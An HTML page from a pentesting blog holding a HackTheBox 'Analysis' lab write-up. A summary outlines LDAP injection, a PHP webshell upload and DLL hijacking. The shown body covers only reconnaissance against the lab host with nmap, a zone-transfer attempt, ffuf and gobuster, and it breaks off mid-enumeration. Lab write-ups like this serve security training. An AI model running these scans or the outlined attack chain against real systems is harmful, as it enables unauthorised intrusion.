<!doctype html><html lang=en><head><title>HTB Analysis WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Analysis' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Analysis WriteUp"><meta name=twitter:description content="HackThebox 'Analysis' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/analysis/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Analysis WriteUp"><meta property="og:description" content="HackThebox 'Analysis' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-01T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-01T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Winrm"><meta property="article:tag" content="Evil-Winrm"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/analysis/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.064032bdabf71803ac209bfac7afe4609898265440caa172acba739538eb4845.css integrity="sha256-BkAyvav3GAOsIJv6x6/kYJiYJlRAyqFyrLpzlTjrSEU=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/analysis/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/analysis/>HTB Analysis WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-01T00:00:00Z>1 June, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
17-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/winrm/>Winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/evil-winrm/>Evil-Winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/powershell/>Powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cmd/>Cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/winpeas/>Winpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/curl/>Curl</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ldap-injection/>Ldap Injection</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/snort/>Snort</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/dll-hijacking/>Dll Hijacking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/wwwolf/>Wwwolf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/msfvenom/>Msfvenom</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ffuf/>Ffuf</a></span></div></div></header><div class=post-content><h1 id=analysis----hackthebox>Analysis &ndash; HackTheBox
<a class=heading-link href=#analysis----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Hard</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Analysis&rsquo; Avatar" src=/pentesting/images/Analysis_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>We are able to find subdomains for the domain <code>analysis.htb</code> and multiple directories with tools like <code>Gobuster</code> and <code>ffuf</code>. Bruteforcing vulnerable parameters in one of these directories, we find that one is vulnerable to <code>LDAP Injections</code>. Through this vulnerability we find a user and a password that works for an admin panel. Inside this administration panel, we are allowed to upload a <code>PHP</code> webshell and enter in the machine. Using <code>WinPEAS</code> we are able to find credentials for another existant user inside the machine and pivot to this new user. Once logged in as this new user, we see that we can modify <code>.dll</code> files for <code>SNORT</code> service running; allowing us to perform a <code>DLL Hijacking</code> and elevate our privileges.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan shows multiple ports open: <code>53</code> <code>Domain Name System</code> (<code>DNS</code>), <code>80</code> <code>HTTP</code>, <code>88</code> <code>Kerberos</code>, <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), <code>135</code> <code>Microsoft RPC</code>, <code>3268</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>3306</code> <code>MySQL</code>, and <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>); among others</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p53,80,88,135,139,445,464,593,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49794 10.10.11.250 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 17:39 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.250
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.21s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open  domain        Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-18 21:39:35Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>3306/tcp  open  mysql         MySQL (unauthorized)
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>33060/tcp open  mysqlx?
</span></span></span><span class=line><span class=cl><span class=go>| fingerprint-strings:
</span></span></span><span class=line><span class=cl><span class=go>|   DNSStatusRequestTCP, NotesRPC, TLSSessionReq, X11Probe, afp:
</span></span></span><span class=line><span class=cl><span class=go>|     Invalid message&#34;
</span></span></span><span class=line><span class=cl><span class=go>|     HY000
</span></span></span><span class=line><span class=cl><span class=go>|   oracle-tns:
</span></span></span><span class=line><span class=cl><span class=go>|     Invalid message-frame.&#34;
</span></span></span><span class=line><span class=cl><span class=go>|_    HY000
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49675/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49676/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49677/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49682/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49794/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-05-18T21:40:34
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 83.08 seconds
</span></span></span></code></pre></div><ul><li>Attempting a <code>Domain Zone Transfer Attack</code> does not work:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ dig axfr analysis.htb @10.10.11.250
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr analysis.htb @10.10.11.250
</span></span></span><span class=line><span class=cl><span class=go>;; global options: +cmd
</span></span></span><span class=line><span class=cl><span class=go>; Transfer failed.
</span></span></span></code></pre></div><p>and the site at <code>http://10.10.11.250</code> does not show anything with <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.10.11.250
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;&#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;META HTTP-EQUIV=&#34;Content-Type&#34; Content=&#34;text/html; charset=us-ascii&#34;&gt;&lt;/HEAD&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/BODY&gt;&lt;/HTML&gt;
</span></span></span></code></pre></div><ul><li>Now, scanning port <code>445</code> <code>SMB</code> with <code>NetExec</code> (the successor of <code>CrackMapExec</code>) shows the domain <code>analysis.htb</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.250
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
</span></span></span></code></pre></div><p>So I add this target and domain to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.250 analysis.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.250 analysis.htb
</span></span></span></code></pre></div><ul><li>Next, I will start searching for subdomains with <code>ffuf</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://analysis.htb/ -H &#39;Host: FUZZ.analysis.htb&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://analysis.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.analysis.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 155ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [19966/19966] :: Job [1/1] :: 124 req/sec :: Duration: [0:02:38] :: Errors: 0 ::
</span></span></span></code></pre></div><p>and find one domain: <code>internal.analysis.htb</code>
So I add <code>internal.analysis.htb</code> to my <code>/etc/hosts</code> file, so now this file looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.250 analysis.htb internal.analysis.htb
</span></span></span></code></pre></div><ul><li>Trying to visit this new domain, <code>http://internal.analysis.htb</code>, now returns <code>403 Fordidden</code>:</li></ul><p><img alt="Analysis 1" src=/pentesting/images/Analysis_1.png></p><ul><li>I then decide to find directories with a <code>Brute Force Directory Listing</code> with <code>Gobuster</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://internal.analysis.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/users                (Status: 301) [Size: 170] [--&gt; http://internal.analysis.htb/users/]
</span></span></span><span class=line><span class=cl><span class=go>/dashboard            (Status: 301) [Size: 174] [--&gt; http://internal.analysis.htb/dashboard/]
</span></span></span><span class=line><span class=cl><span class=go>/Users                (Status: 301) [Size: 170] [--&gt; http://internal.analysis.htb/Users/]
</span></span></span><span class=line><span class=cl><span class=go>/employees            (Status: 301) [Size: 174] [--&gt; http://internal.analysis.htb/employees/]
</span></span></span><span class=line><span class=cl><span class=go>/Dashboard            (Status: 301) [Size: 174] [--&gt; http://internal.analysis.htb/Dashboard/]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 220560 / 220561 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><ul><li>Then I decide to search for files in these three directories. Eventually I find some <code>PHP</code> files at <code>/users</code> directory:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/users/ -t 55 -x php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://internal.analysis.htb/users/
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/list.php             (Status: 200) [Size: 17]
</span></span></span><span class=line><span class=cl><span class=go>/List.php             (Status: 200) [Size: 17]
</span></span></span></code></pre></div><p>where we find a file <code>/users/list.php</code>
For <code>/dashboard</code> we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/dashboard/ -t 55 -x php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://internal.analysis.htb/dashboard/
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/img                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/img/]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 200) [Size: 38]
</span></span></span><span class=line><span class=cl><span class=go>/uploads              (Status: 301) [Size: 182] [--&gt; http://internal.analysis.htb/dashboard/uploads/]
</span></span></span><span class=line><span class=cl><span class=go>/upload.php           (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>/details.php          (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/css/]
</span></span></span><span class=line><span class=cl><span class=go>/Index.php            (Status: 200) [Size: 38]
</span></span></span><span class=line><span class=cl><span class=go>/lib                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/lib/]
</span></span></span><span class=line><span class=cl><span class=go>/form.php             (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 177] [--&gt; http://internal.analysis.htb/dashboard/js/]
</span></span></span><span class=line><span class=cl><span class=go>/logout.php           (Status: 302) [Size: 3] [--&gt; ../employees/login.php]
</span></span></span><span class=line><span class=cl><span class=go>/tickets.php          (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/emergency.php        (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/IMG                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/IMG/]
</span></span></span><span class=line><span class=cl><span class=go>/INDEX.php            (Status: 200) [Size: 38]
</span></span></span><span class=line><span class=cl><span class=go>/Details.php          (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/Form.php             (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/CSS                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/CSS/]
</span></span></span><span class=line><span class=cl><span class=go>/Img                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/Img/]
</span></span></span><span class=line><span class=cl><span class=go>/JS                   (Status: 301) [Size: 177] [--&gt; http://internal.analysis.htb/dashboard/JS/]
</span></span></span><span class=line><span class=cl><span class=go>/Upload.php           (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>/Uploads              (Status: 301) [Size: 182] [--&gt; http://internal.analysis.htb/dashboard/Uploads/]
</span></span></span><span class=line><span class=cl><span class=go>/Logout.php           (Status: 302) [Size: 3] [--&gt; ../employees/login.php]
</span></span></span><span class=line><span class=cl><span class=go>/Lib                  (Status: 301) [Size: 178] [--&gt; http://internal.analysis.htb/dashboard/Lib/]
</span></span></span><span class=line><span class=cl><span class=go>/Tickets.php          (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>/Emergency.php        (Status: 200) [Size: 35]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 441120 / 441122 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>And we also find a <code>login.php</code> at <code>/employees</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://internal.analysis.htb/employees/ -t 55 -x php
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://internal.analysis.htb/employees/
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
